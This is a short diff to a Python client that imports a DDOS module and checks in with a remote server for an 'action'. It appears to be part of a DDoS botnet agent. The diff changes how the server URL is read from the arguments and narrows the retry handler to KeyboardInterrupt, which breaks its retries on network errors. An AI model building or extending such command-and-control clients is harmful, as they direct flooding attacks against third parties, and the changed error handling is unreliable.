@@ -13,7 +13,11 @@ import DDOS
 
 # 全局变量初始化
 version = 1
-url = sys.argv[1]
+for i in range(1, 10):
+    url = sys.argv[i]
+    if url[:4] == "http":
+        break
+
 
 action = -1
 
@@ -61,13 +65,14 @@ def init():
     # 初始化与服务端的通讯
     global action
     while True:
+        print(url)
         try:
             r = requests.post(url + "init", data={"name": name}).json()
             action = r["action"]
             print("服务器通讯初始化成功！")
             send_message("初始化成功！")
             return
-        except:
+        except KeyboardInterrupt:
             print("服务器通讯初始化失败！15秒后重新尝试...")
             time.sleep(15)
 
